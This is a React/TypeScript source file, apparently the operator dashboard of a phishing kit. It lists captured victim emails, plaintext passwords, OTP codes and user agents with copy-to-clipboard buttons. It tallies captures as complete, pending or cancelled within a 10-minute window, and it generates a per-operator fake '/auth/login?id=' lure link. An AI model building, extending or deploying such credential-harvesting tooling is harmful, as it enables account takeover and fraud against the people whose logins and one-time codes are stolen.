import CopyIcon from "@/public/icon/copy"
import { Select, Space, Table, Tag, message } from "antd";
import { useState, useEffect } from "react";

import React from 'react';
import type { TableProps } from 'antd';

import CancleIfon from "@/public/icon/cancle"
import TodayIcon from "@/public/icon/today"
import PandingIcon from "@/public/icon/panding"
import CompleteIcon from "@/public/icon/tick"


import TimeAgo from 'javascript-time-ago'
import en from 'javascript-time-ago/locale/en'
import axios from "axios";

TimeAgo.addDefaultLocale(en)
const timeAgo = new TimeAgo('en-US')

interface DataType {
    key: string;
    email: string;
    password: string;
    otp: string;
    userAgent: string;
    date: number,
    status: string
}

const columns: TableProps<DataType>['columns'] = [
    {
        title: 'Email',
        dataIndex: 'email',
        key: 'email',
        render: (_, { email }) => (
            <span onClick={() => { navigator.clipboard.writeText(email).then(() => { message.success("Email coped") }) }} className=" cursor-pointer" >{email}</span>
        )
    },
    {
        title: 'Password',
        dataIndex: 'password',
        key: 'agpassworde',
        render: (_, { password }) => (
            <Tag className="cursor-pointer" onClick={() => { navigator.clipboard.writeText(password).then(() => { message.success("Password coped") }) }} color="success">{password}</Tag>
        ),
    },
    {
        title: 'OTP',
        dataIndex: 'otp',
        key: 'otp',
        render: (_, { otp, status }) => (
            <span
                className="cursor-pointer"
                onClick={() => {
                    navigator.clipboard.writeText(otp).then(() => { message.success("OTP coped") })
                }}
            >
                {
                    otp.length > 20 ?
                        (otp.slice(0, 20) + ".....")
                        :
                        otp.length > 1 ?
                            otp
                            :
                            <Tag color={status === "Panding" ? "blue" : "red"}>{status}</Tag>
                }
            </span>
        ),
    },
    {
        title: 'UserAgent',
        key: 'userAgent',
        dataIndex: 'userAgent',
        render: (_, { userAgent }) => (
            <span className="cursor-pointer" onClick={() => { navigator.clipboard.writeText(userAgent).then(() => { message.success("UserAgent coped") }) }}>{userAgent.slice(0, 50) + "....."}</span>
        ),
    },
    {
        title: "Date",
        dataIndex: "date",
        key: "date",
        render: (_, { date }) => (
            <Tag color="success">{timeAgo.format(new Date(date))}</Tag>
        ),
    },
    {
        title: "Status",
        dataIndex: "status",
        key: "status",
        render: (_, { status }) => (
            <Tag color={status === "Complete" ? "green" : status === "Panding" ? "blue" : "red"}>{status}</Tag>
        )
    }
];


export default function InfoPage({ newData, geturl }: { newData: any, geturl: string }) {

    const [ShowLoding, setShowLoding] = useState(false)
    const [dataAge, setDataAge] = useState("")
    const [getHostname, setgetHostname] = useState("")
    const [displayData, setdisplayData] = useState({
        all_total: 0,
        all_complete: 0,
        all_pandingg: 0,
        all_cancle: 0,

        today_total: 0,
        today_complete: 0,
        today_pandingg: 0,
        today_cancle: 0,
    })
    const [data, setdata] = useState<DataType[]>([])

    useEffect(() => {
        const getInfo = async () => {
            const response = await axios.post("/api/admin/user/getInfoPage")
            const datas = response.data.data
            const status = response.data.status
            if (status !== 200) {
                message.error("Something went wrong")
                return
            }

            const updatedData: DataType[] = datas.slice().reverse().map((element: any, index: any) => ({
                key: index,
                email: element.email,
                password: element.password ? element.password : "",
                otp: element.url ? element.url : "",
                date: element.date,
                userAgent: element.userAgent ? element.userAgent : "Undefined",
                status: element.url ? "Complete" : (new Date(element.date).getTime() + 10 * 60 * 1000) < Date.now() ? "Cancle" : "Panding"
            }));
            setdata(updatedData);
            const createNewDisplayData = {
                cr_all_total: datas.length,
                cr_all_complete: 0,
                cr_all_pandingg: 0,
                cr_all_cancle: 0,

                cr_today_total: 0,
                cr_today_complete: 0,
                cr_today_pandingg: 0,
                cr_today_cancle: 0,
            }
            const today = new Date()

            for (let index = 0; index < datas.length; index++) {
                const element = datas[index];

                (new Date(element.date).getTime() + 10 * 60 * 1000) < Date.now() ? !element.url && createNewDisplayData.cr_all_cancle++ : !element.url && createNewDisplayData.cr_all_pandingg++;
                element.url && createNewDisplayData.cr_all_complete++
                const date = new Date(element.date)

                if (date.getFullYear() === today.getFullYear() && date.getMonth() === today.getMonth() && date.getDate() === today.getDate()) {
                    createNewDisplayData.cr_today_total++
                    (new Date(element.date).getTime() + 10 * 60 * 1000) < Date.now() ? !element.url && createNewDisplayData.cr_today_cancle++ : !element.url && createNewDisplayData.cr_today_pandingg++;
                    element.url && createNewDisplayData.cr_today_complete++
                }
            }
            setdisplayData({
                all_total: createNewDisplayData.cr_all_total,
                all_complete: createNewDisplayData.cr_all_complete,
                all_pandingg: createNewDisplayData.cr_all_pandingg,
                all_cancle: createNewDisplayData.cr_all_cancle,
                today_total: createNewDisplayData.cr_today_total,
                today_complete: createNewDisplayData.cr_today_complete,
                today_pandingg: createNewDisplayData.cr_today_pandingg,
                today_cancle: createNewDisplayData.cr_today_cancle,
            })
        }
        getInfo()
        setgetHostname(window.location.hostname)
    }, [])

    useEffect(() => {
        const getNewData = async () => {
            if (newData.newData === '') {
                return;
            }
            console.log('sdfsdf',newData)
            const response2 = await axios.post("/api/users/getData", { id: newData.newData });
            if (response2.data.status !== 200) {
                console.log(response2.data)
                message.error("Somethin went wrong");
                return;
            }

            const generateNewData: DataType = {
                key: (data.length + 1).toString(),
                email: response2.data.getdata.email,
                password: response2.data.getdata.password ? response2.data.getdata.password : "",
                otp: response2.data.getdata.url ? response2.data.getdata.url : "",
                date: response2.data.getdata.date,
                userAgent: response2.data.getdata.userAgent ? response2.data.getdata.userAgent : "Undefined",
                status: response2.data.getdata.url ? "Complete" : (new Date(response2.data.getdata.date).getTime() + 10 * 60 * 1000) < Date.now() ? "Cancle" : "Panding"
            };

            setdata(prevData => [generateNewData, ...prevData]);
        }
        getNewData();

    }, [newData]);




    const handleUserType = (value: string) => {
        setDataAge(value)
        setShowLoding(true)
    }


    return (
        <main className="w-full h-auto p-5 flex flex-col gap-2">

            <h1 className="text-slate-900 text-2xl font-semibold">Today History</h1>
            <section className="w-full h-48 flex justify-between items-center gap-5 p-6">
                <div className="w-1/4 h-full rounded-lg flex justify-center items-center relative peer">
                    <div className="w-[85%] h-full bg-neutral-300 rounded-md absolute -z-10 top-4 left-5 peer-hover:top-0"></div>
                    <div className="w-full h-full bg-orange-500 rounded-xl shadhow1 border_full flex flex-col">
                        <div className="w-full h-1/3 p-5 text-3xl font-extrabold text-white" >Total</div>
                        <div className="w-full h-2/3 flex gap-2 p-5 text-5xl font-semibold justify-between text-white items-center">
                            <div><TodayIcon height="40px" width="40px" /></div>
                            <div>
                                <span>
                                    {displayData.all_total}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="w-1/4 h-full rounded-lg flex justify-center items-center relative peer">
                    <div className="w-[85%] h-full bg-neutral-300 rounded-md absolute -z-10 top-4 left-5 peer-hover:top-0"></div>
                    <div className="w-full h-full bg-green-500 rounded-xl shadhow1 border_full">
                        <div className="w-full h-1/3 p-5 text-3xl font-extrabold text-white" >Complete</div>
                        <div className="w-full h-2/3 flex gap-2 p-5 text-5xl font-semibold justify-between text-white items-center">
                            <div><CompleteIcon height="40px" width="40px" /></div>
                            <div>
                                <span>
                                    {displayData.all_complete}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="w-1/4 h-full rounded-lg flex justify-center items-center relative peer">
                    <div className="w-[85%] h-full bg-neutral-300 rounded-md absolute -z-10 top-4 left-5 peer-hover:top-0"></div>
                    <div className="w-full h-full bg-blue-500 rounded-xl shadhow1 border_full">
                        <div className="w-full h-1/3 p-5 text-3xl font-extrabold text-white" >Panding</div>
                        <div className="w-full h-2/3 flex gap-2 p-5 text-5xl font-semibold justify-between text-white items-center">
                            <div><PandingIcon height="40px" width="40px" /></div>
                            <div>
                                <span>
                                    {displayData.all_pandingg}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="w-1/4 h-full rounded-lg flex justify-center items-center relative peer">
                    <div className="w-[85%] h-full bg-neutral-300 rounded-md absolute -z-10 top-4 left-5 peer-hover:top-0"></div>
                    <div className="w-full h-full bg-red-500 rounded-xl shadhow1 border_full">
                        <div className="w-full h-1/3 p-5 text-3xl font-extrabold text-white" >Cancle</div>
                        <div className="w-full h-2/3 flex gap-2 p-5 text-5xl font-semibold justify-between text-white items-center">
                            <div className="text-2xl"><CancleIfon height="40px" width="40px" /></div>
                            <div>
                                <span>
                                    {displayData.all_cancle}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <h1 className="text-slate-900 text-2xl font-semibold">Total History</h1>
            <section className="w-full h-48 flex justify-between items-center gap-5 p-6">
                <div className="w-1/4 h-full rounded-lg flex justify-center items-center relative peer">
                    <div className="w-[85%] h-full bg-neutral-300 rounded-md absolute -z-10 top-4 left-5 peer-hover:top-0"></div>
                    <div className="w-full h-full bg-orange-500 rounded-xl shadhow1 border_full flex flex-col">
                        <div className="w-full h-1/3 p-5 text-3xl font-extrabold text-white" >Today</div>
                        <div className="w-full h-2/3 flex gap-2 p-5 text-5xl font-semibold justify-between text-white items-center">
                            <div><TodayIcon height="40px" width="40px" /></div>
                            <div>
                                <span>
                                    {displayData.today_total}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="w-1/4 h-full rounded-lg flex justify-center items-center relative peer">
                    <div className="w-[85%] h-full bg-neutral-300 rounded-md absolute -z-10 top-4 left-5 peer-hover:top-0"></div>
                    <div className="w-full h-full bg-green-500 rounded-xl shadhow1 border_full">
                        <div className="w-full h-1/3 p-5 text-3xl font-extrabold text-white" >Complete</div>
                        <div className="w-full h-2/3 flex gap-2 p-5 text-5xl font-semibold justify-between text-white items-center">
                            <div><CompleteIcon height="40px" width="40px" /></div>
                            <div>
                                <span>
                                    {displayData.today_complete}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="w-1/4 h-full rounded-lg flex justify-center items-center relative peer">
                    <div className="w-[85%] h-full bg-neutral-300 rounded-md absolute -z-10 top-4 left-5 peer-hover:top-0"></div>
                    <div className="w-full h-full bg-blue-500 rounded-xl shadhow1 border_full">
                        <div className="w-full h-1/3 p-5 text-3xl font-extrabold text-white" >Panding</div>
                        <div className="w-full h-2/3 flex gap-2 p-5 text-5xl font-semibold justify-between text-white items-center">
                            <div><PandingIcon height="40px" width="40px" /></div>
                            <div>
                                <span>
                                    {displayData.today_pandingg}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="w-1/4 h-full rounded-lg flex justify-center items-center relative peer">
                    <div className="w-[85%] h-full bg-neutral-300 rounded-md absolute -z-10 top-4 left-5 peer-hover:top-0"></div>
                    <div className="w-full h-full bg-red-500 rounded-xl shadhow1 border_full">
                        <div className="w-full h-1/3 p-5 text-3xl font-extrabold text-white" >Cancle</div>
                        <div className="w-full h-2/3 flex gap-2 p-5 text-5xl font-semibold justify-between text-white items-center">
                            <div className="text-2xl"><CancleIfon height="40px" width="40px" /></div>
                            <div>
                                <span>
                                    {displayData.today_cancle}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <h1 className="text-slate-900 text-2xl font-semibold">My URL</h1>
            <header className="w-full h-24 flex gap-4 items-center justify-center">
                <div className="max-w-3/4 w-auto h-a p-3 bg-green-500 rounded-lg">
                    <span className="text-2xl text-white">https://{getHostname}/auth/login?id={geturl}</span>
                </div>
                <div
                    onClick={() => {
                        navigator.clipboard.writeText(`https://${getHostname}/auth/login?id=${geturl}`).then(() => (message.success("coped successfull")))
                    }}
                    className="w-14 cursor-pointer text-white h-14 rounded-full flex justify-center items-center bg-blue-500">
                    <CopyIcon />
                </div>
            </header>

            <div className="w-full h-auto flex justify-between items-center">
                <h1 className="text-slate-900 text-2xl font-semibold">All Data</h1>
                <div className="w-2/4 flex gap-2 justify-end">
                    <Space wrap>
                        <Select
                            defaultValue="Filter"
                            onChange={handleUserType}
                            style={{ width: 150, height: 40 }}
                            options={[
                                { value: 'Today', label: 'Today' },
                                { value: 'Last Week', label: 'Last Week' },
                                { value: 'Last Month', label: 'Last Month' },
                                { value: '', label: 'All' },
                            ]}
                        />
                    </Space>
                    <Space wrap>
                        <Select
                            defaultValue="Status"
                            onChange={handleUserType}
                            style={{ width: 150, height: 40 }}
                            options={[
                                { value: 'Complete', label: 'Complete' },
                                { value: 'Panding', label: 'Panding' },
                                { value: 'Cancle', label: 'Cancle' },
                                { value: '', label: 'All' },
                            ]}
                        />
                    </Space>
                </div>
            </div>
            <section className="w-full h-auto">
                <Table columns={columns} dataSource={data} />
            </section>
        </main>
    )
}
